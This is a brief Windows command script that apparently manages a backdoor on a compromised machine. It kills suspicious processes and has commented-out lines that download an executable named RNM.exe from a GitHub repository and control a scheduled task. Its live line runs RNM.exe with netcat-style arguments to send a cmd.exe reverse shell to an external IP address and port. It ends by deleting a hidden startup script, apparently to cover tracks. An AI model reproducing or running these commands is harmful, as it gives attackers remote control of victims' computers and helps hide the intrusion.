taskkill /F /IM Disk-Updating.exe
#taskkill /F /IM lml.exe
#C:\Users\seba\Downloads\lml.exe
#C:\Users\angel\Downloads\Disk-Updating.exe
#Stop-ScheduledTask -TaskName zed
#Start-ScheduledTask -TaskName zed
#taskkill /F /IM RNM.exe
#Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/RNM.exe -OutFile C:\Users\Public\RNM.exe
C:\Users\Public\RNM.exe -nv 193.161.193.99 22352 -e cmd.exe
attrib -h C:\Users\Public\MyStartUp.ps1
del C:\Users\Public\MyStartUp.ps1

